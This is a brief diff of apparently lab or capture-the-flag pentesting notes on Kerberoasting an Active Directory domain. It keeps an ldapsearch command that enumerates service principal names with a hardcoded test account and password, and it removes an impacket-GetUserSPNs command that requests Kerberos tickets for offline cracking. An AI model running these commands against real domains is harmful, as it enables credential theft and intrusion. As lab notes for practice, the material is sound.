@@ -1,5 +1,2 @@
 SPN Enumeration
 ldapsearch -x -H ldap://10.3.32.11 -D 'tou@l33thackers.stellar.tech' -w 'password' -b "DC=l33thackers,DC=stellar,DC=tech" | grep -i -C 5 servicePrincipalName: | grep -i -C 5 @l33t
-
-Requesting the Kerberos Ticket
-impacket-GetUserSPNs -request -dc-ip 10.3.32.11 l33thackers.stellar.tech/tou:'password' -outputfile l33tspnauthtickets.txt
